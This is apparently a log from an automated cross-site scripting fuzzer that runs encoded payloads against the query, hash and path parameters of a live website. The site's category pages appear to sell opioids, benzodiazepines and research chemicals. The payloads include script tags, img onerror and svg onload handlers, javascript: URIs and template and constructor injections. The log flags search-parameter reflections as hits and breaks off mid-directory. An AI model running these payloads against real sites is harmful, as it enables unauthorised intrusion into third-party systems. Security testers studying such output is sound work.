+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/uber-uns?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/geschaft
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/geschaft?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/geschaft?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/geschaft?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/geschaft?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/geschaft#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/geschaft/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kategorie/opioide-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opioide-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opioide-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opioide-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opioide-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/cannabinoid-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/benzodiazepine-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/stimulanzien-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/opiate-und-stimulanzien#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/opiate-und-stimulanzien/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kategorie/forschungschemikalien-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
